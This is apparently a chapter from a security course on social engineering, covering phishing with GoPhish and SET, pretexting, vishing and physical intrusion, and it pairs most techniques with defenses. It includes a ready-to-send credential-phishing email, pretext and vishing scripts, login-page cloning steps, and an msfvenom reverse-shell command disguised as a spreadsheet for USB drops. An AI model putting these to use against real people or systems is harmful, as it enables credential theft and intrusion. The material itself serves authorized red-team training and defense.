---
title: "Social Engineering"
subtitle: "Phishing campaigns, pretexting, vishing, physical intrusion — and the defenses that actually work."
chapter: 13
level: "intermediate"
readingTime: "10 min"
topics: ["social engineering", "phishing", "pretexting", "vishing", "spear phishing", "GoPhish", "SET"]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**Real-World Analogy**

The best locks in the world don't protect against a convincing phone call: "Hi, this is IT support — we detected unusual activity on your account. I just need you to confirm your password to restore access." Humans are the most exploitable attack surface.

</Callout>

## Why Social Engineering Works

Technical defenses stop technical attacks. But no firewall blocks a convincing email.

```
Key psychological triggers attackers exploit:
  Authority    → "I'm calling from the IT department / CEO's office"
  Urgency      → "Your account will be locked in 30 minutes"
  Fear         → "We've detected suspicious activity on your account"
  Reciprocity  → "I helped you last time — now I need a small favor"
  Liking       → build rapport before making the request
  Social proof → "Everyone else has already updated their credentials"
  Scarcity     → "This offer expires today"
```

## Phishing

### GoPhish — Phishing Campaign Platform

```bash
# Install
wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip
unzip gophish-linux-64bit.zip
./gophish

# Access at: https://localhost:3333
# Default: admin / (shown in startup output)

# Setup flow:
# 1. Sending Profiles → configure SMTP server
# 2. Landing Pages → create fake login page (import any URL)
# 3. Email Templates → craft phishing email
# 4. Users & Groups → upload target email list
# 5. Campaigns → launch, track clicks, credential captures
```

### Email Template Craft

```html
<!-- Example: IT helpdesk credential phishing -->
Subject: ACTION REQUIRED: Your account will be suspended

Dear {{.FirstName}},

Our security systems detected unusual sign-in activity on your account.
To prevent unauthorized access, please verify your identity within 24 hours.

Verify Now: {{.URL}}

If you don't verify, your account will be temporarily suspended.

IT Security Team
```

**GoPhish variables:** `{{.FirstName}}`, `{{.LastName}}`, `{{.Email}}`, `{{.URL}}` (unique tracking link per user)

### Spear Phishing (Targeted)

Generic phishing: 1% click rate.
Spear phishing (personalized): 30%+ click rate.

```
Personalization from OSINT:
- Name and title (LinkedIn)
- Current projects (LinkedIn posts, company blog)
- Colleagues' names (company directory)
- Recent company news (press releases)
- Software the company uses (job postings, Shodan)

Example spear phish:
  "Hi Sarah, I'm reaching out regarding the Kubernetes migration
   project you're leading. Marcus from DevOps asked me to share
   the updated infrastructure credentials sheet — please review
   and confirm the access is correct: [malicious link]"

This works because:
- Uses Sarah's name (trust)
- References real project name from LinkedIn
- Names a real colleague (Marcus — also from LinkedIn)
- Asks for normal work behavior (reviewing credentials)
```

### Phishing Page Setup (SET)

```bash
# Social Engineering Toolkit
sudo setoolkit

# Menu navigation:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# Enter: URL to clone (e.g., https://accounts.google.com)
# SET clones the page, serves it, captures submitted credentials

# OR: use gophish for tracked campaigns with reporting
```

## Pretexting

Creating a fabricated scenario to establish credibility:

```
Scenario: "IT Audit" pretext for physical access
Attacker: Badge with "Security Auditor" label, clipboard, suit
Script:   "Hi, I'm from the external audit team. The CTO scheduled us
           to review physical security controls this week. I need access
           to the server room to document the rack layout."

Why it works:
- Professional appearance creates authority
- Reference to senior executive (CTO)
- Legitimate-sounding business reason
- Audits are normal — people don't want to obstruct one
- Asking for documentation (not "access to hack things")

Defense: Badge verification, visitor check-in system, escort policy,
         call-back verification to manager before granting access
```

## Vishing (Voice Phishing)

```
Target: Help desk / IT support employees

Attack flow:
1. Recon: find employee names from LinkedIn
2. Pretext: "I'm Alice Johnson from HR, my computer crashed and I
             have a presentation in 20 minutes for the CFO"
3. Urgency: "I really need to reset my password right now"
4. Social proof: "I called yesterday and James helped me"
5. Close: "Can you just reset it to Temp1234! and I'll change it
           after my meeting?"

Success indicators:
- Help desk workers are trained to help → exploits their good nature
- Urgency prevents them from following process
- Authority (HR, executive) makes them not want to look obstructive

Defense:
- Strict callback verification to manager's known number
- Never reset passwords verbally — always require ticket + email verification
- "I understand you're in a hurry — I need to follow process to protect your account"
```

## Physical Intrusion

```
Techniques:
  Tailgating      → follow someone through a badge door
  Impersonation   → delivery person, contractor, visitor
  USB drops       → leave "found: employee payroll 2024" labeled drives
                    employees plug them in out of curiosity
  Shoulder surfing → observe screens in public spaces, coffee shops
  Dumpster diving → documents thrown away without shredding

USB Drop payload (authorized testing only):
- msfvenom -p windows/shell_reverse_tcp LHOST=x LPORT=4444 -f exe -o "Q3 Bonuses.exe"
- icon changed to Excel spreadsheet icon
- Employee double-clicks → reverse shell
- In 2016 study: 48% of dropped USB drives were plugged in
```

## Building a Phishing Campaign (Authorized Red Team)

```bash
# Phase 1: OSINT (see Recon chapter)
# Collect: employee names, emails, roles, current projects

# Phase 2: Infrastructure
# Register lookalike domain: examp1e.com, example-security.com
# Set up SMTP server or use SendGrid/Mailgun
# Obtain TLS cert for landing page (Let's Encrypt)
# Clone target's login page

# Phase 3: Pretext
# Pick a scenario relevant to the organization:
# - "IT security mandate: verify your credentials"
# - "HR: update your direct deposit info"
# - "DocuSign: sign your NDA renewal"
# - "Zoom: your meeting link has changed"

# Phase 4: Launch and track
# GoPhish dashboard shows:
# - Emails sent
# - Emails opened (tracking pixel)
# - Links clicked
# - Credentials submitted
# - Report attachment opened

# Phase 5: Report (critical!)
# Document who clicked, who submitted credentials
# Recommendations: training, technical controls (MFA!)
# Never shame individuals — system failed, not the person
```

## Defenses That Actually Work

```
Technical:
  MFA (TOTP or hardware key)     → phished password alone = useless
  Email filtering + sandboxing   → catch known phishing infra
  SPF + DKIM + DMARC             → prevent spoofed sender addresses
  Passkeys / FIDO2               → cryptographic, not phishable
  URL rewriting + scanning       → safe links analyze URLs at click time
  Privileged access workstations → separate machines for admin actions

Process:
  Caller authentication protocol → never grant access on a verbal request
  Visitor management system       → escort, badge, sign-in
  Clean desk policy               → no passwords on sticky notes
  Document destruction policy     → shred, don't recycle bin
